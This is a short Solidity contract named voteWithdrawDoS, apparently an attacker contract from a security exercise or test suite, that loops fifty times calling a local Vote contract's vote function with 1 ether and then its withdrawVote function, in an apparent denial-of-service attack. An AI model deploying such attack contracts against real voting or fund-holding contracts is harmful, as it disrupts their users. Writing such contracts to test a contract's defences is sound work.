import "contracts/vote.sol";

contract voteWithdrawDoS {
    Vote public ballot;
    constructor(address _ballotAddress) {
        ballot = Vote(_ballotAddress);
    }

    function attack() external payable  {
        for (uint i=0; i<50; i++) 
        {
            ballot.vote{value: 1 ether}(1);
            ballot.withdrawVote();
        }
            
    }

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }
    event Received(address sender, uint256 amount);

}